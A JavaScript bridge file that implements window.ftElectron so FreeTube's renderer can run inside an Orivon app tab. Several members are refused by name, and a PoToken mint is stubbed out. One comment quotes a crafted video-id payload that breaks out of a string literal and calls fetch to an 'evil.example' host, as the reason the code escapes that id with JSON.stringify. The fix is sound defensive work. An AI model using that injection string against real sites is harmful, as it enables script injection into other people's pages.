// window.ftElectron for upstream FreeTube's own Electron renderer, running
// UNMODIFIED inside an Orivon app tab. Injected by prepare.mjs's --build step
// as the first <head> script, classic and synchronous, so it exists before
// FreeTube's bundle runs -- src/renderer/main.js calls
// window.ftElectron.handleChangeView at module top level.
//
// The 34 members are every `window.ftElectron.<name>` call site in the
// clone's src/renderer (grep -rhoE 'window\.ftElectron\.[a-zA-Z]+'
// src/renderer | sort -u), grouped as freetube-bridge-spec.md groups them.
//
// A member Orivon cannot honour REFUSES BY NAME with a reason, never by
// being absent. apps/freetube/lib/ft-electron.js has the same pattern; it is
// reproduced here rather than imported, because each app stands alone.
(function () {
  'use strict'

  const REFUSAL_REASONS = {
    excluded: 'excluded from Orivon by decision',
    'shell-owned': 'the browser owns this, not the app',
    'not-built': 'not built in this port'
  }

  class FtBridgeError extends Error {
    constructor (member, reason, detail) {
      super(`ftElectron.${member} is unavailable: ${REFUSAL_REASONS[reason]}${detail === undefined ? '' : ` (${detail})`}`)
      this.name = 'FtBridgeError'
      this.member = member
      this.reason = reason
    }
  }

  function refuse (member, reason, detail) {
    return () => { throw new FtBridgeError(member, reason, detail) }
  }

  /**
   * Web platform group: every member here is a web platform API already
   * reachable from an app tab, needing no orivon.* capability at all.
   */
  function webPlatformApi () {
    let wakeLock

    return {
      requestFullscreen: () => {
        // Not awaited at its one call site (ft-shaka-video-player.js fires
        // this only on a deep link, outside a user gesture), so an unhandled
        // rejection here would otherwise be blamed on the wrong caller.
        const result = document.documentElement.requestFullscreen()
        result.catch(() => {})
        return result
      },
      requestPiP: () => {
        const video = document.querySelector('video')
        if (video === null) return Promise.resolve()
        const result = video.requestPictureInPicture()
        result.catch(() => {})
        return result
      },
      setZoomFactor: (factor) => { document.documentElement.style.zoom = String(factor) },
      getSystemLocale: () => navigator.language,
      startPowerSaveBlocker: async () => {
        if (!('wakeLock' in navigator)) return
        try { wakeLock = await navigator.wakeLock.request('screen') } catch { /* denied or unsupported */ }
      },
      stopPowerSaveBlocker: async () => {
        const held = wakeLock
        wakeLock = undefined
        await held?.release()
      },
      // process.platform compiles to the literal `undefined` for a web build
      // (_scripts/webpack.web.config.js's DefinePlugin), so
      // GeneralSettings.vue's `process.platform === 'linux'` guard around
      // the one call site never evaluates true. false either way.
      isWaylandPlatform: () => false
    }
  }

  /**
   * Player cache group: the stream-URL cache youtubei.js keeps between a
   * search result and the watch page. Memory-only, like the port next door
   * (apps/freetube/lib/ft-electron.js's playerCacheApi): entries expire in
   * hours, so persisting them would spend the app's disk quota on data
   * that is stale by the next launch.
   */
  function playerCacheApi () {
    const cache = new Map()
    return {
      playerCacheGet: async (key) => cache.get(key),
      playerCacheSet: async (key, value) => { cache.set(key, value) }
    }
  }

  /**
   * Downloads group, over the one route out of the app's own directory: a
   * picked folder IS the consent (capability-api.ts's OrivonFs.userSelected
   * doc comment), so there is no separate grant to request. Mirrors
   * apps/freetube/lib/ft-electron.js's downloadApi.
   */
  function downloadApi (fs) {
    let folder = null
    return {
      chooseDefaultFolder: async () => {
        if (fs === undefined) throw new FtBridgeError('chooseDefaultFolder', 'not-built', 'no fs grant')
        folder = await fs.userSelected({ directory: true })
      },
      writeToDefaultFolder: async (name, bytes) => {
        if (folder === null || folder === undefined) return false
        await folder.writeFile(name, bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes))
        return true
      }
    }
  }

  /**
   * Listeners group: one window, no second process to sync with, so every
   * member here records the callback FreeTube hands it and never fires it.
   * `recorded` is not part of the public bridge -- only the unit tests read
   * it, through installFtElectronBridge's own return value.
   */
  function listenersApi () {
    const recorded = {}
    const recorder = (name) => (callback) => { recorded[name] = callback }
    const api = {
      handleChangeView: recorder('handleChangeView'),
      handleOpenUrl: recorder('handleOpenUrl'),
      handleUpdateSearchInputText: recorder('handleUpdateSearchInputText'),
      handleOpenInExternalPlayerResult: recorder('handleOpenInExternalPlayerResult'),
      handleSyncHistory: recorder('handleSyncHistory'),
      handleSyncPlaylists: recorder('handleSyncPlaylists'),
      handleSyncProfiles: recorder('handleSyncProfiles'),
      handleSyncSearchHistory: recorder('handleSyncSearchHistory'),
      handleSyncSettings: recorder('handleSyncSettings'),
      handleSyncSubscriptionCache: recorder('handleSyncSubscriptionCache')
    }
    return { api, recorded }
  }

  /**
   * Session state group: inert values FreeTube's own renderer accepts, and
   * no-ops for the setters. getNavigationHistory returns one entry marked
   * active so TopNav.vue's `dropdownOptions.find(option => option.active)`
   * never sees undefined -- an empty array throws the next time the page
   * title changes while this call is in flight (setNavigationHistoryDropdownOptions
   * assigns straight to `activeEntry.label`).
   */
  function sessionStateApi () {
    return {
      getNavigationHistory: async () => [{ label: document.title, active: true, value: 0 }],
      setInvidiousAuthorization: () => {},
      clearInvidiousAuthorization: () => {},
      getReplaceHttpCache: async () => false,
      toggleReplaceHttpCache: () => {},
      getDisableHardwareAcceleration: async () => false,
      toggleDisableHardwareAcceleration: () => {}
    }
  }

  /**
   * Refused by name: every call site for these five is reached only from a
   * user action FreeTube's chrome offers (external player, proxy settings,
   * relaunch-after-setting-change, a shift-clicked link) -- never during
   * page mount, so refusing them does not stop the watch page from
   * rendering. Mirrors apps/freetube/lib/ft-electron.js's refusedApi.
   */
  function refusedApi () {
    return {
      openInExternalPlayer: refuse('openInExternalPlayer', 'excluded', 'subprocess is cut from v0'),
      relaunch: refuse('relaunch', 'shell-owned'),
      openInNewWindow: refuse('openInNewWindow', 'shell-owned'),
      enableProxy: refuse('enableProxy', 'shell-owned', 'proxy configuration is browser-level'),
      disableProxy: refuse('disableProxy', 'shell-owned', 'proxy configuration is browser-level')
    }
  }

  // #region generatePoToken -- ADR-0019 (web.context), not yet implemented in this branch

  let cachedBotGuardScript

  async function fetchBotGuardScript () {
    if (cachedBotGuardScript !== undefined) return cachedBotGuardScript
    const response = await fetch('/orivon/botGuardScript.js')
    if (!response.ok) throw new Error(`botGuardScript.js: HTTP ${response.status}`)
    cachedBotGuardScript = await response.text()
    return cachedBotGuardScript
  }

  /**
   * src/main/poTokenGenerator.js's own rewrite: swap the module's
   * `export{X as default};` tail for a call passing this mint's own
   * arguments, spliced in as the JSON-string literals FreeTube already
   * serialised them to.
   *
   * `videoId` is the one argument here that is NOT already a JSON-string
   * literal upstream produced -- it is a bare string that ultimately traces
   * back to the URL (`#/watch/<videoId>`, an attacker-reachable route), so
   * upstream's own `"${videoId}"` splice would let a crafted id such as
   * `"});fetch("https://evil.example");//` break out of the string literal
   * and inject script into the youtube.com context this runs in.
   * `JSON.stringify(videoId)` closes that: whatever `videoId` contains, the
   * result is one JSON string literal. `context`/`initialAttestationData`/
   * `ytConfig` stay spliced as-is because they are already
   * `JSON.stringify` output from FreeTube's own call site (`local.js`), not
   * raw input -- re-encoding them would double-encode, and upstream's real
   * Electron build splices them the same way.
   */
  function rewriteBotGuardScript (script, videoId, context, initialAttestationData, ytConfig) {
    const exportMatch = script.match(/export\{(\w+) as default\};/)
    if (exportMatch === null) {
      throw new Error('botGuardScript.js: no `export{X as default};` tail -- pack:botGuardScript output changed shape')
    }
    const params = `${JSON.stringify(videoId)},${context},${initialAttestationData},${ytConfig}`
    return `${script.slice(0, exportMatch.index)};${exportMatch[1]}(${params})`
  }

  // Upstream runs one mint at a time over its single Electron session
  // (poTokenGenerator.js's enqueueAsyncFunction); an open WebContext costs an
  // app one of LIMITS.webContexts, so the same discipline applies here.
  let mintQueue = Promise.resolve()

  function queueMint (run) {
    const result = mintQueue.then(run, run)
    mintQueue = result.then(() => {}, () => {})
    return result
  }

  /**
   * Not implemented in this branch: `orivon.web` (ADR-0019, web-context-spec.md
   * section 1) lands in a separate PR. Written against that contract so the
   * only thing that changes once it lands is which branch runs -- see
   * apps/freetube-real/README.md.
   */
  function generatePoToken (getOrivon, videoId, context, initialAttestationData, ytConfig) {
    return queueMint(async () => {
      const orivon = getOrivon()
      if (orivon?.web === undefined) {
        throw new FtBridgeError('generatePoToken', 'not-built', 'orivon.web is not implemented in this build; ADR-0019 lands separately')
      }
      const script = await fetchBotGuardScript()
      const mintScript = rewriteBotGuardScript(script, videoId, context, initialAttestationData, ytConfig)
      const ctx = await orivon.web.openContext('https://www.youtube.com', { width: 1920, height: 1080 })
      try {
        return await ctx.evaluate(mintScript)
      } finally {
        await ctx.close()
      }
    })
  }

  // #endregion generatePoToken

  /**
   * Builds the bridge and installs it as window.ftElectron. `fs` follows
   * apps/freetube/lib/ft-electron.js's own rule: the app's orivon.fs when the
   * fs grant is live, undefined otherwise, so a declined grant refuses by
   * name at the download call sites instead of throwing at load time.
   *
   * `getOrivon` is a thunk rather than a captured value so a test can hand
   * this a fake that changes what it returns between calls (a grant revoked
   * mid-session, orivon.web landing later); the real caller always returns
   * the live `window.orivon`.
   */
  function installFtElectronBridge (getOrivon) {
    const orivon = getOrivon()
    const fs = orivon?.fs
    const listeners = listenersApi()

    const bridge = {
      ...webPlatformApi(),
      ...playerCacheApi(),
      ...downloadApi(fs),
      ...listeners.api,
      ...sessionStateApi(),
      ...refusedApi(),
      generatePoToken: (videoId, contextJson, attestationJson, ytConfigJson) =>
        generatePoToken(getOrivon, videoId, contextJson, attestationJson, ytConfigJson)
    }

    window.ftElectron = bridge
    return { bridge, recordedListeners: listeners.recorded }
  }

  installFtElectronBridge(() => window.orivon)

  // Exposed for the unit tests only (a classic script has no module exports):
  // they build a second bridge against a fake `orivon` without touching the
  // real `window.ftElectron`.
  if (typeof globalThis !== 'undefined') {
    globalThis.__ftElectronBridgeInternals = { installFtElectronBridge, FtBridgeError, rewriteBotGuardScript }
  }
})()
